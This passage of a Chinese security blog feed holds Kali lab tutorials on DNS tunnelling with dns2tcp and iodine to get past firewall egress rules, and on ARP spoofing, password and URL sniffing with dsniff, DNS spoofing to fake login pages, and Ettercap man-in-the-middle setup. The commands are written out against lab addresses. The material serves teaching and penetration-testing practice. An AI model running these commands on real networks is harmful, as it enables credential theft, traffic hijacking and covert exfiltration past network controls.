error</code>报错，如下解决方法：</strong></p><pre class="line-numbers language-none"><code class="language-none">1、普通进程占用53端口第一步： netstat -anp | grep:53 # 找到占用的53端口第二步：执行 kill PID 杀死对应进程即可2、若是systemd-resolved服务占用53端口第一步：systemctl stop systemd-resolved  # 停止服务第二步：vim &#x2F;etc&#x2F;systemd&#x2F;resolved.conf   # 编辑配置文件第三步：按照以下内容修改后保存[Resolve]DNS&#x3D;8.8.8.8  #取消注释，增加dns#FallbackDNS&#x3D;#Domains&#x3D;#LLMNR&#x3D;no#MulticastDNS&#x3D;no#DNSSEC&#x3D;no#Cache&#x3D;yesDNSStubListener&#x3D;no  #取消注释，把yes改为no第四步：ln -sf &#x2F;run&#x2F;systemd&#x2F;resolve&#x2F;resolv.conf &#x2F;etc&#x2F;resolv.conf  # 运行此命令后重启即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214013206865.png" alt="image-20230214013206865"></p><blockquote><p>至此服务器端配置完成</p></blockquote><h4 id="dns2tcpc"><a href="#dns2tcpc" class="headerlink" title="dns2tcpc"></a>dns2tcpc</h4><h5 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h5><ul><li><code>dns2tcpc -c -k pass123 -d 1 -l 2222 -r ssh -z test.lab.com</code></li></ul><blockquote><p>-c：启动压缩，提高网络访问效率</p><p>-k：连接密码</p><p>-d：debug level 1-3</p><p>-l：侦听，本地侦听</p><p>-r：资源，服务端提供的资源</p><p>-z：区域，利用那个域名找目标服务器</p><p>若不使用<code>-k</code>配置密码，其他主机也可以使用此命令连接到隧道进行其他访问</p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214014723804.png" alt="image-20230214014723804"></p><blockquote><p>此时只是在本地侦听2222端口，并没有建立连接，只有2222端口有流量经过的时候，才会触发寻找域名服务器建立隧道，建立完隧道之后再保持隧道连接</p></blockquote><h5 id="触发流量建立连接"><a href="#触发流量建立连接" class="headerlink" title="触发流量建立连接"></a>触发流量建立连接</h5><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214015952698.png" alt="image-20230214015952698"></p><h5 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h5><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214020709047.png" alt="image-20230214020709047"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214021126879.png" alt="image-20230214021126879"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214021537851.png" alt="image-20230214021537851"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214021956749.png" alt="image-20230214021956749"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214022437212.png" alt="image-20230214022437212"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214022707767.png" alt="image-20230214022707767"></p><h3 id="隧道复用"><a href="#隧道复用" class="headerlink" title="隧道复用"></a>隧道复用</h3><blockquote><p>利用建立好的DNS隧道，在DNS隧道中在建立一条SSH隧道，使客户端成为复用网关，使其他主机通过客户端可以访问其他资源</p></blockquote><h5 id="客户端开启监听"><a href="#客户端开启监听" class="headerlink" title="客户端开启监听"></a>客户端开启监听</h5><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214024855916.png" alt="image-20230214024855916"></p><h5 id="建立ssh隧道"><a href="#建立ssh隧道" class="headerlink" title="建立ssh隧道"></a>建立ssh隧道</h5><blockquote><p>连接本地2222端口建立DNS隧道转发到服务端的22端口的ssh服务，当连接到ssh服务后再与服务端的ssh建立动态端口转发，再侦听本地7002端口，实现隧道复用，其他主机利用sockets代理进行外网访问。</p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214025358473.png" alt="image-20230214025358473"></p><h3 id="实验拓扑-2"><a href="#实验拓扑-2" class="headerlink" title="实验拓扑 2"></a>实验拓扑 2</h3><blockquote><p>防火墙限制只允许内网DNS服务器访问外网指定DNS服务器UDP 53端口</p><p>内网DNS服务器：安装DNS服务，配置转发器到外网DNS服务器</p><p>Kali：内网主机，网卡仅主机</p><p>内网DNS Server：Win2008克隆，网卡仅主机</p><p>DNS Server：Win2008，网卡NAT（外网DNS）</p><p>Ubuntu：受控DNS，网卡NAT</p><p><strong>原理：内网中有内网DNS Server，内网中的主机DNS请求只能发送给内网DNS，再有内网DNS转发给公网DNS服务器，公网服务器中子域的lab.com委派，找到Ubuntu主机的过程</strong></p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214103346178.png" alt="image-20230214103346178"></p><h4 id="内网DNS配置转发器"><a href="#内网DNS配置转发器" class="headerlink" title="内网DNS配置转发器"></a>内网DNS配置转发器</h4><blockquote><p>转发到外网IP</p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214111056351.png" alt="image-20230214111056351"></p><h4 id="配置内网主机DNS文件"><a href="#配置内网主机DNS文件" class="headerlink" title="配置内网主机DNS文件"></a>配置内网主机DNS文件</h4><blockquote><p>指向内网DNS服务器IP</p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214111313045.png" alt="image-20230214111313045"></p><h4 id="开启dns2tcpd服务"><a href="#开启dns2tcpd服务" class="headerlink" title="开启dns2tcpd服务"></a>开启dns2tcpd服务</h4><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214111643597.png" alt="image-20230214111643597"></p><h4 id="客户端侦听端口"><a href="#客户端侦听端口" class="headerlink" title="客户端侦听端口"></a>客户端侦听端口</h4><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214111721905.png" alt="image-20230214111721905"></p><h4 id="产生访问流量建立隧道"><a href="#产生访问流量建立隧道" class="headerlink" title="产生访问流量建立隧道"></a>产生访问流量建立隧道</h4><blockquote><p>此时已经建立DNS隧道，并且在其中同时建立了SSH动态端口转发隧道</p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214111852125.png" alt="image-20230214111852125"></p><h3 id="Iodine"><a href="#Iodine" class="headerlink" title="Iodine"></a>Iodine</h3><blockquote><ul><li><p>基于DNS查询的隧道工具</p></li><li><p>与同类工具相比的优点</p><ul><li>对下行数据不进行编码，因此性能优</li><li>支持多平台：Linux、BSD（Unix分支）、Mac OS、Windows</li><li>最大16个并发连接（建立16个并发的隧道）</li><li>强制密码支持</li><li>支持同网段隧道IP（不同于服务器、客户端网段）</li><li>支持多种DNS记录类型</li><li>丰富的隧道质量检测措施</li></ul></li><li><p>iodine隧道：会给隧道两端分别分配一个同一个网段的IP地址，此相同网段不能相同于客户端和服务端使用的网段，相当于在客户端和服务端建立了一条虚拟的网线。</p></li><li><p>隧道网络接口</p><ul><li>不基于资源的通用隧道，如同本网段内两台相邻的主机通信</li><li>服务端和客户端分别生成隧道网络接口dns0</li><li>隧道两端接口的IP地址应不同于客户端和服务端的IP网段</li><li>基于此隧道可嵌套其他隧道技术</li></ul></li></ul></blockquote><h4 id="服务端运行iodined"><a href="#服务端运行iodined" class="headerlink" title="服务端运行iodined"></a>服务端运行iodined</h4><p>拓扑图与dns2tcp相同</p><ul><li><code>iodined -f -c 10.0.0.1 test.lab.com</code></li></ul><blockquote><p>-f：使程序在前端运行</p><p>-c：检查客户端ip</p><p>10.0.0.1：指定服务端的ip，会生成新的网卡</p><p>test.lab.com：指定域名，基于那个域名建立DNS隧道</p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214172442394.png" alt="image-20230214172442394"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214172909288.png" alt="image-20230214172909288"></p><h4 id="客户端运行iodine"><a href="#客户端运行iodine" class="headerlink" title="客户端运行iodine"></a>客户端运行iodine</h4><ul><li><code>iodine -f 10.0.0.2 test.lab.com</code></li></ul><blockquote><p>客户端IP：内网DNS服务器ip地址，不是隧道客户端ip，直接运行<code>iodine -f test.lab.com</code>于服务端建立连接后，客户端会自动为自己分配一个ip10.0.0.2</p></blockquote><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214173807289.png" alt="image-20230214173807289"></p><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214174027882.png" alt="image-20230214174027882"></p><h4 id="ssh连接服务端"><a href="#ssh连接服务端" class="headerlink" title="ssh连接服务端"></a>ssh连接服务端</h4><p><img src="/2023/02/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/image-20230214174234076.png" alt="image-20230214174234076"></p><h3 id="Windows—Iodine"><a href="#Windows—Iodine" class="headerlink" title="Windows—Iodine"></a>Windows—Iodine</h3><h4 id="安装TAB适配器"><a href="#安装TAB适配器" class="headerlink" title="安装TAB适配器"></a>安装TAB适配器</h4><blockquote><p>windows下的iodine需要有一块虚拟网卡TAP（Virtual Ethernet Adapter ）</p><p>利用openvpn软件安装TAB和所需依赖包</p><p>其他运行命令与Linux中无异</p></blockquote><p>openvpn下载地址：<br><a href="https://openvpn.en.softonic.com/">https://openvpn.en.softonic.com/</a></p><h4 id="安装windows客户端"><a href="#安装windows客户端" class="headerlink" title="安装windows客户端"></a>安装windows客户端</h4><p>iodine官网：</p><p><a href="https://code.kryo.se/iodine/">https://code.kryo.se/iodine/</a></p>]]></content>
      
      
      <categories>
          
          <category> 隧道技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 隧道技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-密码破解【三】</title>
      <link href="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/"/>
      <url>/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="密码嗅探"><a href="#密码嗅探" class="headerlink" title="密码嗅探"></a>密码嗅探</h2><blockquote><ul><li><p>二、三层地址</p><ul><li>IP 网络到网络</li><li>MAC 主机到主机</li></ul></li><li><p>交换机与HUB</p><ul><li>HUB全端口转发</li><li>交换机根据学习地址转发</li><li>混杂模式抓包</li></ul></li><li><p>ARP协议</p><ul><li>免费ARP</li><li>基于广播学习</li><li>以太网头、ARP头</li><li>请求、响应相对独立</li><li>基于传闻的协议</li></ul></li></ul></blockquote><h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><h4 id="发送arp欺骗包"><a href="#发送arp欺骗包" class="headerlink" title="发送arp欺骗包"></a>发送arp欺骗包</h4><ul><li><code>arpspoof -t 192.168.216.157 -r 192.168.216.2</code></li></ul><blockquote><p>对win7主机说中间人是网关，告诉真实网关中间人是win7，进行双向毒化</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209170212001.png" alt="image-20230209170212001"></p><blockquote><p>此时win7主机的MAC地址已被欺骗为中间人MAC，网关路由器此时的MAC也是中间人的MAC</p></blockquote><h4 id="开启中间人路由功能"><a href="#开启中间人路由功能" class="headerlink" title="开启中间人路由功能"></a>开启中间人路由功能</h4><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209170531217.png" alt="image-20230209170531217"></p><h4 id="进行网络嗅探"><a href="#进行网络嗅探" class="headerlink" title="进行网络嗅探"></a>进行网络嗅探</h4><h5 id="使受害机产生访问流量"><a href="#使受害机产生访问流量" class="headerlink" title="使受害机产生访问流量"></a>使受害机产生访问流量</h5><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209171012129.png" alt="image-20230209171012129"></p><h5 id="中间人进行网络嗅探"><a href="#中间人进行网络嗅探" class="headerlink" title="中间人进行网络嗅探"></a>中间人进行网络嗅探</h5><blockquote><p>受害机产生的一切流量都会被中间人嗅探到，其中可以抓到受害机的用户名及密码，也可以抓取cookie伪造身份</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209171126153.png" alt="image-20230209171126153"></p><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209171457303.png" alt="image-20230209171457303"></p><h3 id="网络嗅探工具"><a href="#网络嗅探工具" class="headerlink" title="网络嗅探工具"></a>网络嗅探工具</h3><h4 id="driftnet"><a href="#driftnet" class="headerlink" title="driftnet"></a>driftnet</h4><blockquote><p>将抓下来的数据包中传输的图片都还原出来</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209171816688.png" alt="image-20230209171816688"></p><ul><li><code>driftnet -i eth0</code></li></ul><blockquote><p>-i：设置要监听的接口，即时看到捕获的图片，图片不保存</p><p><strong>靶机需要通过http方式来浏览图片，若是使用https方式则因数据加密而无法捕获图片。</strong></p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209171910883.png" alt="image-20230209171910883"></p><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209174522988.png" alt="image-20230209174522988"></p><ul><li><code>driftnet -i eth0 -a -d tempdir -s</code></li></ul><blockquote><p> -a：不在屏幕上显示图片</p><p>-d：指定一个目录</p><p>-s：抓取声音文件，必须是MPEG格式</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209174550324.png" alt="image-20230209174550324"></p><h4 id="webspy"><a href="#webspy" class="headerlink" title="webspy"></a>webspy</h4><blockquote><p>抓取url，不是很稳定</p><p>host参数：填被骗的客户端主机IP</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209174923901.png" alt="image-20230209174923901"></p><ul><li><code>webspy -i eth0 192.168.216.157</code></li></ul><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209175341557.png" alt="image-20230209175341557"></p><blockquote><p>程序本身不稳定导致</p></blockquote><h4 id="urlsnarf"><a href="#urlsnarf" class="headerlink" title="urlsnarf"></a>urlsnarf</h4><blockquote><p>抓取url，比较稳定</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209175450537.png" alt="image-20230209175450537"></p><ul><li><code>urlsnarf -i eth0</code></li></ul><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209175634994.png" alt="image-20230209175634994"></p><h4 id="dsniff"><a href="#dsniff" class="headerlink" title="dsniff"></a>dsniff</h4><blockquote><p>专门用来嗅探密码</p><p>支持解码的文件：&#x2F;usr&#x2F;share&#x2F;dsniff&#x2F;dsniff.services</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209175735690.png" alt="image-20230209175735690"></p><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209175919214.png" alt="image-20230209175919214"></p><ul><li><code>dsniff -i eth0 -m</code></li></ul><blockquote><p>-m：自动进行传输协议的解码</p><p>凡是在文件中支持的协议都可以进行密码的嗅探</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209184321266.png" alt="image-20230209184321266"></p><h3 id="DNS欺骗—dnsspoof"><a href="#DNS欺骗—dnsspoof" class="headerlink" title="DNS欺骗—dnsspoof"></a>DNS欺骗—dnsspoof</h3><blockquote><p>启动DNS欺骗，让被骗的受害机访问的<a href="http://www.abc.com对应的`ip1`直接欺骗到`ip2`,在`ip2`上可以放置虚假的www.abc.com的登录页面达到欺骗的目的/">www.abc.com对应的`IP1`直接欺骗到`IP2`，在`IP2`上可以放置虚假的www.abc.com的登录页面达到欺骗的目的</a></p><p>添加虚假域名的文件：<code>/usr/share/dsniff/dnsspoof.hosts</code></p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209190205557.png" alt="image-20230209190205557"></p><h4 id="添加虚假域名"><a href="#添加虚假域名" class="headerlink" title="添加虚假域名"></a>添加虚假域名</h4><ul><li>在<code>/usr/share/dsniff/dnsspoof.hosts</code>文件中添加DNS欺骗的域名</li></ul><blockquote><p>IP和域名之间需要使用Tab键，不是空格</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209185837798.png" alt="image-20230209185837798"></p><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209185825409.png" alt="image-20230209185825409"></p><h4 id="开始欺骗"><a href="#开始欺骗" class="headerlink" title="开始欺骗"></a>开始欺骗</h4><ul><li><code>dnsspoof -i eth0 -f /usr/share/dsniff/dnsspoof.hosts</code></li></ul><blockquote><p>-f：表示调用文件中设置好的域名进行欺骗</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209190357908.png" alt="image-20230209190357908"></p><blockquote><p>启动之后，其中并不是侦听本地53端口，而是侦听本地53端口的流量，根据受害机请求的数据包中的内容来进行内容的篡改；有哪些客户端访问DNS服务器产生的流量会被侦听，一旦发现其中请求的是<code>*.google.com / *.taobao.com /*.youtube.com</code>就会把回包中的内容篡改为虚假IP地址</p></blockquote><h5 id="访问虚假域名"><a href="#访问虚假域名" class="headerlink" title="访问虚假域名"></a>访问虚假域名</h5><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230209192427832.png" alt="image-20230209192427832"></p><blockquote><p>当受害机访问某些站点就会重定向到虚假IP站点，其中在虚假IP放相应的页面，可欺骗用户名和密码</p></blockquote><h3 id="DNS欺骗代理—dnschef"><a href="#DNS欺骗代理—dnschef" class="headerlink" title="DNS欺骗代理—dnschef"></a>DNS欺骗代理—dnschef</h3><blockquote><p>流程：</p><p>攻击机通过某些手段或者漏洞修改了受害机本地DNS服务的配置，使其将DNS服务的配置指向攻击机，接着在攻击机上启动dnschef伪造几条域名解析的记录，或者解析到另外一台自己的服务器；当被修改了DNS配置之后的受害机发送DNS请求后，会将DNS请求发送给攻击机，攻击机收到请求后会返回一个错误的IP和对应关系，同时攻击机也会向真正的DNS服务器发起查询请求，真正的DNS服务器返回给攻击机正确的解析关系。</p><p>攻击前提：</p><p>需要有能力手动修改客户端网络参数的配置：</p><p>1、修改客户端hosts文件</p><p>2、修改DNS网络参数配置，指向攻击机</p></blockquote><h4 id="伪造DNS服务"><a href="#伪造DNS服务" class="headerlink" title="伪造DNS服务"></a>伪造DNS服务</h4><ul><li><code>dnschef --fakeip=192.168.216.171 --fakedomains=www.google.com,www.youtube.com --interface 192.168.216.171 -q</code></li></ul><blockquote><p>–fakeip：欺骗的域名要解析到那个IP上</p><p>–fakedomains：欺骗的域名</p><p>–interface：攻击机网卡对应的IP</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210102835500.png" alt="image-20230210102835500"></p><blockquote><p>此时已经开始监听53端口</p></blockquote><h4 id="修改受害机的网络配置"><a href="#修改受害机的网络配置" class="headerlink" title="修改受害机的网络配置"></a>修改受害机的网络配置</h4><blockquote><p>当ping测试<a href="http://www.google.com时,解析到的ip为192.168.216.167/">www.google.com时，解析到的IP为192.168.216.167</a></p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210102930742.png" alt="image-20230210102930742"></p><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210103130019.png" alt="image-20230210103130019"></p><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210103324893.png" alt="image-20230210103324893"></p><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210103458818.png" alt="image-20230210103458818"></p><blockquote><p>当受害机查询的域名不在攻击机的域名记录中存在时，攻击机会向上游（真实域名）查询请求之后发送给客户端；当流量被重定向后，所有的流量都会经过攻击机。</p></blockquote><h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><h3 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a>Ettercap</h3><blockquote><ul><li>统一的中间人攻击工具</li><li>转发MAC与本机相同，但IP与本机不同的数据包</li><li>支持SSH1、SSL中间人攻击</li><li>模块划分<ul><li>Snifer  # 嗅探<ul><li>负责数据包转发</li><li>Unified<ol><li>单网卡情况下独立完成三层包转发</li><li>始终禁用内核IP_Forward功能</li></ol></li><li>Bridge<ol><li>双网卡情况下的一层MITM模式</li><li>可作为IPS过滤数据包</li><li>不可在网关上使用（透明网桥）</li></ol></li></ul></li><li>MITM  # 中间人<ul><li>把流量重定向到ettercap主机上</li><li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li><li><strong>Bridge模式不支持SSL MITM</strong></li><li>实现MITM的方法<ul><li>ARP</li><li>ICMP：ICMP路由重定向，半双工</li><li>DHCP：修改网关地址，半双工</li><li>Switch Port Stealing   # 交换机端口窃取<ol><li>flood目标地址是本机，源地址是受害者的包</li><li>适用于ARP静态绑定的环境</li></ol></li><li>NDP：IPv6协议欺骗技术</li></ul></li></ul></li><li>Filter  # 过滤</li><li>Log</li><li>Plugin</li></ul></li></ul></blockquote><h4 id="用户界面"><a href="#用户界面" class="headerlink" title="用户界面"></a>用户界面</h4><blockquote><p>-T 文本界面</p><p>-G 图形界面</p><p>-C 基于文本的图形界面</p><p>-D 后台模式</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210124859835.png" alt="image-20230210124859835"></p><h4 id="指定目标"><a href="#指定目标" class="headerlink" title="指定目标"></a>指定目标</h4><blockquote><p>IPv4：MAC&#x2F;IPs&#x2F;IPv6&#x2F;Ports</p><p>IPv6：MAC&#x2F;IPs&#x2F;IPv6&#x2F;Ports</p><p>例：mac1&#x2F;10.0.0.1−5,11&#x2F;&#x2F;25,80 mac2&#x2F;10.0.1.33&#x2F;&#x2F;20−25,80,110</p><p><strong>第二个<code>/</code>和第三个<code>/</code>之间填写IPv6，不写也需要占位</strong></p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210200307484.png" alt="image-20230210200307484"></p><h4 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h4><blockquote><p>需要root权限打开链路层Socket连接，然后使用nobody账号运行</p><p>日志写入目录需要nobody有写入权</p><p>ettercap主配置文件：&#x2F;etc&#x2F;ettercap&#x2F;etter.conf</p><p>修改etter.conf：EC_UID&#x3D; 0   # 赋予ettercap为root权限，能够写入日志</p></blockquote><p><img src="/2023/02/09/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%89%E3%80%91/image-20230210194311532.png" alt="image-20230210194311532"></p><h3 id="字符模式"><a href="#字符模式" class="headerlink" title="字符模式"></a>字符模式</h3><ul><li><code>ettercap -i 